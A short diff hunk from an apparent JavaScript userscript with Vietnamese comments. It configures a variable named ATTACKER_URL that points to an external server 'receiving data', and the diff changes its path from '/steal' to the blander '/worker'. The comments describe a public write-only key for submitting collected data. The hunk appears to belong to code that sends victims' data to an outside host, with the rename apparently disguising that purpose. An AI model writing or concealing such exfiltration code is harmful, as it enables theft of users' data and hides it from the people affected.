@@ -22,7 +22,7 @@
   'use strict';
 
   // ⚙️ CẤU HÌNH
-  var ATTACKER_URL = "https://misterxplo.pythonanywhere.com/steal";  // Server nhận dữ liệu
+  var ATTACKER_URL = "https://misterxplo.pythonanywhere.com/worker";  // Server nhận dữ liệu
   // WRITE_KEY: Chỉ có quyền GHI - nằm trong file public (ai cũng thấy)
   // Nếu bị lộ, kẻ xấu chỉ ghi được dữ liệu giả, KHÔNG đọc được gì
   // ADMIN_KEY (đọc dữ liệu) KHÔNG BAO GIỜ đặt trong file này!
